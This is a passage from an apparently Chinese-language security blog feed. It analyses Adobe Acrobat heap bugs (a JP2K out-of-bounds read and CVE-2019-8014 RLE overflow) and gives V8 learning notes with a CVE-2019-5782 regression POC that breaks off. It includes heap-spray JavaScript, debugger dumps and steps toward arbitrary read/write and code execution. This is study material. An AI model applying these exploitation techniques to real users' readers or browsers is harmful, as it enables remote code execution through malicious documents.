title="整个漏洞利用过程"></a>整个漏洞利用过程</h3><p>通过以上的分析过程可知漏洞函数JP2KLib!JP2kCopyRect+0xbae6中对访问的buffer检验有误，导致可以越界读取之后8字节的内容（0xff的获取有可能是pclr突然中断导致），所以该8字节的内容为攻击者可控，并在之后用于精确释放内存，最终通过精确释放，并重用该释放的地址，获取一个超长element，以实现全局内存读写，最终导致任意代码执行。</p><ol><li>通过heap spray a1布置大量比buffer稍大的Uint32Array，将Uint32Array中249,250位置的element设置为需要释放的地址，之后将a1中奇数elemnt释放（以便于之后JP2KLib中解析图片时被分配到）。</li><li>heap spray sprayarr布置之后需要释放的内存对象（即sprayarr）。</li><li>通过加载指定大小的jp2k图片，导致解析jp2k图片时分配的内存为之前某一个a1中的hole，之后运行到JP2KLib!JP2kCopyRect+0xbae6，漏洞触发越界读取249,250偏移处（即sprayarr中两个相连的elment）的内存并释放（合计0×20000），转化为类UAF的利用。</li><li>同上。</li><li>通过sprayarr2的赋值抢占释放的0×20000内存，一旦抢占成功，sprayarr中之前被释放的elment的长度就会被修改为0×20000。</li><li>最终通过精确释放，并重用该释放地址，获取一个超长element，以实现全局内存读写，再通过全局内存读写，伪造bookmarkRoot的对象实现任意代码执行。好像是因为bookmarkRoot有个execute，方便直接执行。</li></ol><h2 id="深入分析Adobe忽略了6年的PDF漏洞"><a href="#深入分析Adobe忽略了6年的PDF漏洞" class="headerlink" title="深入分析Adobe忽略了6年的PDF漏洞"></a>深入分析Adobe忽略了6年的PDF漏洞</h2><p><a href="https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability<br>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><p>硬核diff补丁，发现解析RLE时有溢出，整数溢出。也就是CVE-2013时修了，没修好那个。</p><p>具体可以看到下面，明显有个溢出可以过检查，下面可以越界写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F AcroForm 2019.012.20036 中修复的基本块</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width ||</span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// 可控数据实现堆块越界写</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 解压数据</span></span><br></pre></td></tr></table></figure><p>RLE4的也差不多，稍复杂一些，就不粘代码了，不过是两处，其中RLE8少的那一处就是2013年修的那个。</p><p>RLE4 数据解析过程中存在的两处溢出点很难实现稳定利用，因为在向扫描线填充像素数据时，偏移值为 xpos 的值除以 2 ，此时偏移值最大可以是 0xFFFFFFFF / 2 = 0x7FFFFFFF ，也就意味着仅能向高地址方向实现堆块越界写，而且这个地址上具体是什么数据很难控制。</p><p>而 RLE8 数据解析过程中存在的溢出点就相对好控制一些，因为在向扫描线填充像素数据时，偏移值就是 xpos 本身，这样就可以向低地址方向实现堆块越界写，而且越界写的范围在一定程度上也是可控的。在下面的代码中，(unsigned __int8)cmd 的最大值可以是 0xFF ，为了绕过 if 语句中的条件检查，xpos 的最小值是 0xFFFFFF01 （在有符号类型下表示为 -255）。这也就意味着最大可以向低地址方向越界写 0xFF 字节的数据。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>这个还是说的比较清晰的。</p><h4 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h4><p>这里借助 ArrayBuffer 来完成内存布局，js通常都是这个套路。</p><p>因为位图解析过程中创建的堆块大小为 0xF0 字节，因此 ArrayBuffer 的 byteLength 可以设置为 0xE0 。为了创建内存空洞，可以先创建大量的 ArrayBuffer 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure><p>在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure><p>因为可以向低地址方向越界写 0xF4 字节的 0x10 数据，所以触发漏洞之后，ArrayBuffer 对象的 backing store 的内存布局如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer 数据</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束</span><br><span class="line">; 下一个堆块的元数据（存储位图数据的堆块）</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; 位图数据</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>此时 ArrayBuffer 对象的 byteLength 被改成了 0x10101010 ，但是 DataView 对象的指针也被改成了 0x10101010 ，前面提到过这会导致进程崩溃。</p><p>为了避免进程崩溃，需要提前在地址 0x10101010 上布局数据，让这个地址看起来就是一个 DataView 指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。</p><p>同样，这里借助 ArrayBuffer 实现精确的内存布局：</p><p>创建大量 byteLength 为 0xFFE8 的 ArrayBuffer<br>在特定内存范围内，ArrayBuffer 的 backing store 将有序的出现在地址 0xYYYY0048 上之所以选择 0xFFE8 ，是因为这会使得 backing store 所在堆块整体的大小为 0x10000 ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这仅仅只能防止漏洞触发后进程的崩溃，如果要为该 ArrayBuffer 关联新的 DataView 来读写数据，那么会导致新的崩溃。同样，填充一点新的数据就可以防止进程崩溃，新的代码如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 防止触发漏洞之后进程立刻 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 防止关联 DataView 对象时 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="全局读写"><a href="#全局读写" class="headerlink" title="全局读写"></a>全局读写</h4><p>当 ArrayBuffer 对象的 byteLength 被改成 0x10101010 之后，可以基于这个 ArrayBuffer 对象修改下一个 ArrayBuffer 对象的 byteLength 。在基于 ArrayBuffer 创建内存空洞时，可以在每一个 ArrayBuffer 上存储特定的标记值，这样在内存中搜索 ArrayBuffer 对象就非常简单了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>当下一个 ArrayBuffer 对象的 byteLength 被改成 0xFFFFFFFF 时，基于这个 ArrayBuffer 对象就可以实现用户态空间的全局读写了。</p><h4 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h4><p>一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 ArrayBuffer 对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。</p><p>这里可以通过搜索 ffeeffee 或者 f0e0d0c0 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="剩余步骤"><a href="#剩余步骤" class="headerlink" title="剩余步骤"></a>剩余步骤</h4><p>在拥有任意地址读写能力之后，实现代码执行就是固定的套路了：</p><ul><li>EIP 劫持</li><li>ASLR 绕过</li><li>DEP 绕过</li><li>CFG 绕过</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在我眼中，文档型漏洞就是，Office系列跟Adobe系列，或者其它要解析文档的程序，解析文档有内存控制问题，达到恶意文档可以产生RCE的目的。可能还有一些Word解析公式的问题，暂且都归为文档型，因为具体叫什么怎么分，我也不会分。还有VS Code的RCE的问题，不知道能
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Docs" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Docs/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Docs" scheme="https://github.com/Cracke-S-J/tags/Docs/"/>
    
  </entry>
  
  <entry>
    <title>v8入门学习</title>
    <link href="https://github.com/Cracke-S-J/2020/04/30/v8%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/Cracke-S-J/2020/04/30/v8%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-30T15:18:18.000Z</published>
    <updated>2020-06-07T10:35:06.593Z</updated>
    
    <content type="html"><![CDATA[<p>前一阵好不容易把v8环境搓好了，要学习一波v8、浏览器漏洞。</p><h2 id="入门知识"><a href="#入门知识" class="headerlink" title="入门知识"></a>入门知识</h2><ol><li><a href="https://mp.weixin.qq.com/s/t__Jqzg1rbTlsCHXKMwh6A" target="_blank" rel="noopener">JavaScript 引擎 V8 执行流程概述</a></li><li><a href="https://www.anquanke.com/post/id/185339" target="_blank" rel="noopener">V8 Bug Hunting 之 JS 类型对象的内存布局总结</a></li><li><a href="https://zhuanlan.zhihu.com/p/28780798" target="_blank" rel="noopener">奇技淫巧学 V8 之二，对象在 V8 内的表达</a></li><li><a href="https://juejin.im/post/5cc7dc5af265da038d0b514d" target="_blank" rel="noopener">V8 是怎么跑起来的 —— V8 中的对象表示</a></li><li><a href="https://juejin.im/post/5dc4d823f265da4d4c202d3b" target="_blank" rel="noopener">V8 是怎么跑起来的 —— V8 的 JavaScript 执行管道</a></li><li><a href="https://mp.weixin.qq.com/s/vM9Ahk9axTvNUADjc3kyyg" target="_blank" rel="noopener">手把手教你入门V8漏洞利用</a></li><li><a href="https://www.sunxiaokong.xyz/2020-01-13/lzx-v8001/" target="_blank" rel="noopener">Chrome V8 学习笔记（一）</a></li></ol><p>还有两条入门想说的：</p><ol><li>既然可以泄露地址和任意内存读写，就也可以传统利用，不是非要wasm那种利用。</li><li>具体目的是，构造一个特殊的html，里面写exp的js，然后Victim点开html，达到RCE。</li></ol><h3 id="对象内存布局"><a href="#对象内存布局" class="headerlink" title="对象内存布局"></a>对象内存布局</h3><p>我早就该整理，结果太懒了，明天一定。我的bb还没写，明天一定。明天一定。终于今天一定。</p><table><thead><tr><th style="text-align:center">JSObject</th></tr></thead><tbody><tr><td style="text-align:center">Map</td></tr><tr><td style="text-align:center">Properties</td></tr><tr><td style="text-align:center">Elements</td></tr><tr><td style="text-align:center">Property #1</td></tr><tr><td style="text-align:center">Property#2</td></tr></tbody></table><p>Map大致是个头：</p><ul><li>type： 表述了堆内实例是一个 JSObject 对象</li><li>inobject properties：对象内存储空间（包含未使用的 slots）</li><li>unused property fields：未使用的属性存储空间</li><li>instance size：实例（在堆内）的大小</li><li>constructor：对象构造器</li><li>prototype：对象原型</li><li><p>stable[dictionary]：对象当前状态</p><ul><li>stable_map：快速模式</li><li>dictionary_map：字典模式<br>… …</li></ul></li><li><p>预分配（不超过）一定大小*的空间用作对象内属性存储（inobject_properties）。</p></li><li>预分配空间不足时（无空闲 slot），新增属性会存储在 properties 内。</li><li>数字式属性存储在 elements 内。</li><li>properties/elements 空间不足时会创建（拷贝）一个更大的 FixedArray。</li></ul><p>基本就是这个意思，其它可能不清楚的临用到再调。</p><p>还有对象的快速模式/字典模式，GC的处理等。</p><h3 id="JS部分语法"><a href="#JS部分语法" class="headerlink" title="JS部分语法"></a>JS部分语法</h3><h4 id="Array-from"><a href="#Array-from" class="headerlink" title="Array.from()"></a>Array.from()</h4><p>这个是make一个Array from某些东西。</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from(<span class="string">'foo'</span>) <span class="comment">//Array ["f", "o", "o"]</span></span><br><span class="line"><span class="built_in">Array</span>.from([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], x =&gt; x + x) <span class="comment">// Array [2, 4, 6]</span></span><br></pre></td></tr></table></figure><h4 id="Function-prototype-call"><a href="#Function-prototype-call" class="headerlink" title="Function.prototype.call()"></a>Function.prototype.call()</h4><p>这个主要就是能给指定一个this。</p><h4 id="Symbol-iterator"><a href="#Symbol-iterator" class="headerlink" title="Symbol.iterator"></a>Symbol.iterator</h4><p>就跟通常的迭代器差不多，可以自定义。理解下面这段基本就能理解下面那个chromium821137了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里自定义了一个带迭代器的func，然后call调用，然后传给array.from生成一个Array</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objIter</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name,</span><br><span class="line">    <span class="keyword">this</span>.age  = age,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">objIter.prototype[<span class="built_in">Symbol</span>.iterator] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _this   = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> propers = <span class="built_in">Object</span>.keys(_this);</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        next()&#123;</span><br><span class="line">            <span class="keyword">if</span> (counter &lt; propers.length)&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="attr">value</span>:_this[propers[counter++]], <span class="attr">done</span>:<span class="literal">false</span>&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="attr">value</span>:<span class="literal">undefined</span>, <span class="attr">done</span>:<span class="literal">true</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> objIter(<span class="string">'ss'</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array = [];</span><br><span class="line"><span class="built_in">Array</span>.from.call (</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> array &#125;, obj</span><br><span class="line">);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Array: "</span> + array);</span><br></pre></td></tr></table></figure><h2 id="CVE-2019-5782-v8数组越界-漏洞复现"><a href="#CVE-2019-5782-v8数组越界-漏洞复现" class="headerlink" title="CVE-2019-5782 v8数组越界 漏洞复现"></a>CVE-2019-5782 v8数组越界 漏洞复现</h2><p><a href="https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/</a></p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>TODO: 还没分析，应该是v8优化有问题???</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>这一版有问题。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard b474b3102bd4a95eafcdb68e0e44656046132bc9</span><br><span class="line">gclient sync</span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug/</span><br></pre></td></tr></table></figure><p><a href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04/test/mjsunit/regress/regress-crbug-906043.js" target="_blank" rel="noopener">官方POC</a></p><p>有意思，google官方的regression test。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2018 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span><br><span class="line">  a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a2 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">  a2[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">21</span>] = <span class="number">1.39064994160909e-309</span>;  <span class="comment">// 0xffff00000000</span></span><br><span class="line">  a1[(x &gt;&gt; <span class="number">16</span>) * <span class="number">41</span>] = <span class="number">8.91238232205e-313</span>;  <span class="comment">// 0x2a00000000</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1, a2;</span><br><span class="line"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">a3.length = <span class="number">0x11000</span>;</span><br><span class="line">a3.fill(<span class="number">3.3</span>);</span><br><span class="line"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) fun(...a4);</span><br><span class="line">%OptimizeFunctionOnNextCall(fun);</span><br><span class="line">fun(...a4);</span><br><span class="line">res = fun(...a3);</span><br><span class="line">assertEquals(<span class="number">16</span>, a2.length);</span><br><span class="line"><span class="keyword">for</span> (<span 